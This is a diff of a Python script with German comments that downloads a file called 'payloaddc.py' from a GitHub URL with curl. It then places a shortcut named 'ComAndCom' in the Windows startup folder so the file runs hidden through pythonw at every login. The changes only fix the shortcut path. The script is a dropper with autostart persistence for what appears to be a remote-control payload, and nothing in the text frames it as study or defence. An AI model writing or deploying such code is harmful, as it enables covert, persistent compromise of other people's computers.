@@ -21,7 +21,7 @@ else:
 
 def create_shortcut_to_autostart(script_path, shortcut_name="ComAndCom"):
     # Autostart-Ordner Pfad
-    autostart_path = os.path.join("pythonw ", winshell.startup(), f"{shortcut_name}.lnk {argument}")
+    autostart_path = os.path.join(winshell.startup(), f"{shortcut_name}.lnk")
     
     # Verknüpfung erstellen
     shell = Dispatch('WScript.Shell')
@@ -35,7 +35,7 @@ def create_shortcut_to_autostart(script_path, shortcut_name="ComAndCom"):
     print(f"Shortcut '{shortcut_name}' was created in autostart.")
 
 # Der Pfad zu deinem Python-Skript
-script_to_autostart = f"C:\\Users\\{username}\\payloaddc.py"
+script_to_autostart = f"pythonw C:\\Users\\{username}\\payloaddc.py {argument}"
 
 os.system("cd C:\\Users\\{username} && curl -O https://raw.githubusercontent.com/jkramer5103/stuff/refs/heads/main/payloaddc.py")
 create_shortcut_to_autostart(script_to_autostart, "ComAndCom")
